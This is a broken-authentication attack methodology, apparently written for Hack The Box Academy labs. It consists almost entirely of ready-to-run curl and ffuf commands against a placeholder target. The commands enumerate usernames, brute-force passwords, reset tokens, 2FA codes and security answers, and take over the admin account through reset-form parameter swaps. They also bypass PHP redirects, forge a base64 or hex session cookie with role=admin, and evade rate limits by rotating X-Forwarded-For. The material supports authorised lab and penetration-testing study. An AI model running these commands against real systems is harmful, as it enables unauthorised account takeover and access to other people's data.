# Broken Authentication Methodology

**Core principle:** Authentication is only as strong as its weakest link. Test every step of the auth flow — login, password reset, 2FA, session tokens, and protected page access — independently.

---

## Attack Type Quick Reference

| Attack | Condition | Technique |
|--------|-----------|-----------|
| User enumeration | Different error messages or response sizes | ffuf + `-fr` or `-fs` |
| Password brute force | Known username, no lockout | ffuf with policy-filtered wordlist |
| Weak reset token | Short/numeric token | ffuf with seq-generated wordlist |
| 2FA brute force | Short OTP, no lockout | ffuf with session cookie, low threads |
| Rate limit bypass | IP-based rate limit using X-Forwarded-For | Randomize X-Forwarded-For per request |
| Default credentials | Known product/device | CIRT.net, Google, SecLists |
| Security question brute force | City/name questions, no lockout | ffuf with world-cities wordlist |
| Password reset parameter manipulation | Username in hidden POST field | Swap username to admin in reset request |
| Direct access bypass | PHP redirect without exit | curl without -L, body contains protected content |
| Parameter modification | user_id or similar in URL/POST | Brute-force ID values |
| Session token forgery | Encoded plaintext in cookie | Decode, modify role, re-encode |

---

## Phase 1 — Reconnaissance

### Read the login page first
```bash
curl -s http://<TARGET>/login.php | grep -i "form\|input\|action\|method"
curl -s http://<TARGET>/login.php | grep -i "reset\|forgot\|2fa\|register\|recover"
```

### Discover endpoints
```bash
# Check common auth endpoints
for page in reset.php reset_password.php 2fa.php forgot.php profile.php admin.php dashboard.php; do
  code=$(curl -s -o /dev/null -w "%{http_code}" http://<TARGET>/$page)
  echo "$page: $code"
done
```

### Check for direct access bypass on protected pages
```bash
# If page returns 302, check if body contains protected content
curl -s http://<TARGET>/profile.php | grep -i "flag\|HTB{\|admin"
```

### Register a test account to understand password policy
```bash
curl -s -X POST http://<TARGET>/register.php \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=testuser&password=test" | grep -i "policy\|require\|error"
```

---

## Phase 2 — User Enumeration

### Method 1 — Differing error messages
```bash
ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt \
  -u http://<TARGET>/login.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=FUZZ&password=invalid" \
  -fr "Unknown user"
```

### Method 2 — Differing response sizes
```bash
# Step 1: get baseline size for invalid username
curl -s -X POST http://<TARGET>/login.php \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=invalidxyz&password=test" | wc -c

# Step 2: get size for a known-valid username (register one first)
curl -s -X POST http://<TARGET>/login.php \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=<REGISTERED_USER>&password=wrongpass" | wc -c

# Step 3: fuzz filtering by the invalid-username size
ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt \
  -u http://<TARGET>/login.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=FUZZ&password=invalid" \
  -fs <INVALID_SIZE>
```

---

## Phase 3 — Password Brute Force

### Build policy-filtered wordlist
```bash
# Standard filters (adjust to observed policy)
grep '[[:upper:]]' /usr/share/wordlists/rockyou.txt \
  | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt

# Single-pass awk (faster, especially with exact length requirement)
awk 'length($0) == 12 && /[A-Z]/ && /[a-z]/ && /[0-9]/ && !/[^a-zA-Z0-9]/' \
  /usr/share/wordlists/rockyou.txt > custom_wordlist.txt

wc -l custom_wordlist.txt
```

### Brute-force login
```bash
# Filter by response size (more reliable than error string)
ffuf -w ./custom_wordlist.txt \
  -u http://<TARGET>/login.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=<USER>&password=FUZZ" \
  -fs <INVALID_SIZE>

# Or filter by error string
ffuf -w ./custom_wordlist.txt \
  -u http://<TARGET>/login.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=<USER>&password=FUZZ" \
  -fr "Invalid username"
```

---

## Phase 4 — Weak Password Reset Token

```bash
# Trigger reset for target user
curl -s -X POST http://<TARGET>/reset.php \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin" -c cookies.txt -D - | grep -i "PHPSESSID\|location"

# Generate token wordlist
seq -w 0 9999 > tokens.txt      # 4-digit
seq -w 0 999999 > tokens.txt    # 6-digit

# Test error string
curl -s "http://<TARGET>/reset_password.php?token=0000" | grep -i "invalid\|error"

# Brute force
ffuf -w ./tokens.txt \
  -u "http://<TARGET>/reset_password.php?token=FUZZ" \
  -fr "The provided token is invalid"

# Reset password with valid token
curl -s -X POST "http://<TARGET>/reset_password.php?token=<TOKEN>" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "password=Hacked1234"
```

---

## Phase 5 — 2FA Brute Force

```bash
# Login to get session
curl -s -X POST http://<TARGET>/login.php \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=<USER>&password=<PASS>" \
  -c cookies.txt -D - | grep -i "PHPSESSID\|location"

# Test OTP error string
curl -s -X POST http://<TARGET>/2fa.php \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "PHPSESSID=<SESSION>" \
  -d "otp=0000" | grep -i "invalid\|error"

# Brute force — use low threads to avoid session expiry
seq -w 0 9999 > tokens.txt
ffuf -w ./tokens.txt \
  -u http://<TARGET>/2fa.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "PHPSESSID=<SESSION>" \
  -d "otp=FUZZ" \
  -fr "Invalid OTP." \
  -t 20
```

**Key:** If 2FA brute force keeps timing out, try direct access bypass on the post-2FA protected page using the post-login session.

---

## Phase 6 — Security Question Brute Force

```bash
# Get city wordlist
curl -s "https://raw.githubusercontent.com/datasets/world-cities/main/data/world-cities.csv" \
  | cut -d',' -f1 > city_wordlist.txt

# Trigger reset, get session tied to target user
curl -s -X POST http://<TARGET>/reset.php \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin" -c cookies.txt -D - | grep -i "PHPSESSID"

# Brute force security question
ffuf -w ./city_wordlist.txt \
  -u http://<TARGET>/security_question.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "PHPSESSID=<SESSION>" \
  -d "security_response=FUZZ" \
  -fr "Incorrect response."

# Reset password
curl -s -X POST http://<TARGET>/reset_password.php \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "PHPSESSID=<SESSION>" \
  -d "password=Hacked1234"
```

### Parameter manipulation variant
If username is a hidden field in the reset flow:
```bash
# Swap username to admin in the final reset request
curl -s -X POST http://<TARGET>/reset_password.php \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "PHPSESSID=<SESSION>" \
  -d "password=Hacked1234&username=admin"
```

---

## Phase 7 — Direct Access Bypass

```bash
# PHP redirect without exit — body contains protected content
curl -s http://<TARGET>/admin.php | grep -i "flag\|HTB{"

# Use authenticated session to bypass 2FA gate
curl -s http://<TARGET>/profile.php -b "PHPSESSID=<POST_LOGIN_SESSION>" | grep -i "flag\|HTB{"
```

---

## Phase 8 — Parameter Modification

```bash
# Login to get session + user_id
curl -s -X POST http://<TARGET>/login.php \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=htb-stdnt&password=AcademyStudent!" \
  -c cookies.txt -D - | grep -i "location\|PHPSESSID"

# Brute force user_id to find admin
seq 1 1000 > user_ids.txt
ffuf -w ./user_ids.txt \
  -u "http://<TARGET>/admin.php?user_id=FUZZ" \
  -b "PHPSESSID=<SESSION>" \
  -fr "Could not load admin data"
```

---

## Phase 9 — Session Token Forgery

```bash
# Capture session token after login
curl -s -X POST http://<TARGET>/login.php \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=htb-stdnt&password=<PASS>" \
  -D - | grep -i "set-cookie"

# Decode base64
echo -n '<TOKEN>' | base64 -d

# Forge admin base64 token
echo -n 'user=htb-stdnt;role=admin' | base64

# Decode hex
echo '<TOKEN>' | xxd -r -p

# Forge admin hex token
echo -n 'user=htb-stdnt;role=admin' | xxd -p

# Use forged token
curl -s http://<TARGET>/admin.php -b "session=<FORGED_TOKEN>" | grep -i "flag\|HTB{"
```

---

## Rate Limit Bypass

```bash
# Randomize X-Forwarded-For per request
ffuf -w ./passwords.txt:PASS -w ./ips.txt:IP \
  -u http://<TARGET>/login.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Forwarded-For: IP" \
  -d "username=admin&password=PASS" \
  -fr "Invalid"
```

---

## Default Credentials

1. Try manually: `admin:admin`, `admin:password`, `root:root`, `admin:1234`
2. Search CIRT.net for the product/vendor
3. Google: `<product name> default credentials`
4. SecLists: `Default-Credentials/default-passwords.txt`

---

## Decision Flow

```
Start: curl the login page → read form fields, find all endpoints
  │
  ├─ Same error for invalid user AND wrong password?
  │    └─ Compare response SIZE — enumerate via -fs in ffuf
  │
  ├─ Different error for invalid user vs wrong password?
  │    └─ Enumerate via -fr in ffuf
  │
  ├─ Known username → brute-force password
  │    └─ Password policy shown? → filter wordlist with awk first
  │
  ├─ Login redirects to 2FA?
  │    ├─ Try direct access bypass on post-2FA page with post-login session
  │    └─ If bypass fails → brute-force OTP (low threads, fresh session)
  │
  ├─ Password reset functionality?
  │    ├─ Numeric token → brute-force with seq + ffuf
  │    ├─ Security question → brute-force with city wordlist
  │    └─ Hidden username field → swap to admin
  │
  ├─ Protected page redirects (302)?
  │    └─ curl without -L → check if body contains flag (direct access bypass)
  │
  ├─ URL contains user_id or similar?
  │    └─ Brute-force ID range with ffuf
  │
  └─ Session cookie looks encoded?
       ├─ base64 decode → tamper → re-encode
       └─ hex decode → tamper → re-encode
```
